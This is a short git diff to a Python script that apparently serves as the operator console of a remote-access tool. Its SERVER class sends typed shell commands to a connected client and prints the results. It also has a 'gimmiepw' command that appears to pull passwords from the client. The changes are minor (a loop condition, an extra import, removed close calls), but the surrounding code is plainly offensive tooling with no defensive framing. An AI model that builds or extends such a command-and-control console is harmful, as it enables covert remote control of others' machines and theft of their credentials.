@@ -1,4 +1,4 @@
-import socket
+import socket, subprocess
 from pyfiglet import Figlet
 
 
@@ -67,15 +67,13 @@ class SERVER:
             match command:
                 case 'shell':
                     client.send(command.encode())
-                    while 1:
+                    while True:
                         command = str(input('$ '))
                         client.send(command.encode())
                         if command == 'exit':
                             break
                         data_output = client.recv(1024).decode()
                         print(data_output)
-                    client.close()
-                    sock.close()
 
                 case 'gimmiepw':
                     client.send(command.encode())
